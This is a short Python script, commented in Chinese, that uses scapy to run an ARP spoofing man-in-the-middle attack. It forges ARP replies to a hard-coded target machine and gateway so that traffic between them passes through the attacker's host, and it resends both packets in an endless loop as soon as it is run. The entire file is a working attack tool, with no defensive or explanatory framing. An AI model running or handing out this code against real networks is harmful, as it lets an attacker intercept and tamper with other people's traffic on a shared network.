import threading,time
from scapy.all import (
  ARP,
  Ether,
  sendp
)
import traceback
def createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP):
    '''
    生成ARP数据包，伪造网关欺骗目标计算机
    srcMac:本机的MAC地址，充当中间人
    tgtMac:目标计算机的MAC
    gatewayIP:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
    tgtIP:目标计算机的IP
    op=2,表示ARP响应
    '''
    pkt = Ether(src=srcMac,dst=tgtMac)/ARP(hwsrc=srcMac,psrc=gatewayIP,hwdst=tgtMac,pdst=tgtIP,op=2)
    return pkt
def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
    '''
    生成ARP数据包，伪造目标计算机欺骗网关
    srcMac:本机的MAC地址，充当中间人
    gatewayMac:网关的MAC
    tgtIP:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击
    gatewayIP:网关的IP
    op=2,表示ARP响应
    '''
    pkt = Ether(src=srcMac,dst=gatewayMac)/ARP(hwsrc=srcMac,psrc=tgtIP,hwdst=gatewayMac,pdst=gatewayIP,op=2)
    return pkt
def arp():
  try:
    srcMac='f0:18:98:3d:8e:1a'#本机mac
    tgtMac='bc:17:b8:ca:df:6e'#目标mac
    gatewayMac='0:9:f:9:0:12'#网关mac
    gatewayIP='10.104.255.254'#网关ip
    tgtIP='10.104.0.56'#目标ip
    pktstation = createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP)
    pktgateway = createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP)
    while True:
        t = threading.Thread(target=sendp,args=(pktstation,))
        t.start()
        t.join()
        s = threading.Thread(target=sendp,args=(pktgateway,))
        s.start()
        s.join()
        time.sleep(1)#一般休眠1秒即可，如果不行，修改为0.1秒
  except Exception as g:
    traceback.print_exc()
    exit()

arp()
